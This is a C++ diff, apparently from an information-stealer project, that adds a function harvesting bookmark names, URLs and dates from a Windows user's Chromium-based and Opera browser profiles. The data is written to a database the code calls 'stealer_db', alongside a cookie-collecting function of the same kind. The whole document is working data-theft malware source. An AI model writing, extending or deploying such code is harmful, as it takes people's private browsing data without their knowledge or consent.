@@ -237,5 +237,67 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 
 BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
 {
+	std::vector<DataHolder> data_list;
 
+	std::string target_user_data;
+	std::string target_bookmark_data;
+
+	// Those paths that contains '\\' at the end means they have the default file 'User Data'
+	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
+	for (const auto& dir : browsers_chromium) {
+
+		if (dir.back() == '\\')
+			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
+		else
+		{
+			// in case of opera, the login data is in roaming instead of local
+			if (dir.find("Opera") != std::string::npos)
+				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
+			else
+				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
+		}
+
+		target_bookmark_data = target_user_data + "\\Default\\Bookmarks";
+		std::filesystem::path json_path(target_bookmark_data);
+
+		// Check if the file exists and is a regular file
+		if (!std::filesystem::exists(json_path) || !std::filesystem::is_regular_file(json_path)) {
+			continue;
+		}
+
+		// Open the file using ifstream
+		std::ifstream file(json_path);
+		if (!file.is_open()) {
+			std::cerr << "Error Opening Bookmarks file " << std::endl;  // Print specific error message
+			continue;
+		}
+
+		json j;
+		file >> j;
+		file.close();
+
+		DataHolder data;
+		try {
+			for (const auto& child : j["roots"]["bookmark_bar"]["children"]) {
+				if (child.contains("type") && child["type"] == "url") {
+					data.get_bookmarks_manager().setDateAdded(child.value("date_added", ""));
+					data.get_bookmarks_manager().setName(child.value("name", ""));
+					data.get_bookmarks_manager().setType(child.value("type", ""));
+					data.get_bookmarks_manager().setUrl(child.value("url", ""));
+					data.get_bookmarks_manager().setHost(dir);
+
+					data_list.push_back(data);
+				}
+			}
+		}
+		catch (int e)
+		{
+			continue;
+		}
+	}
+
+	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
+		return false;
+
+	return true;
 }
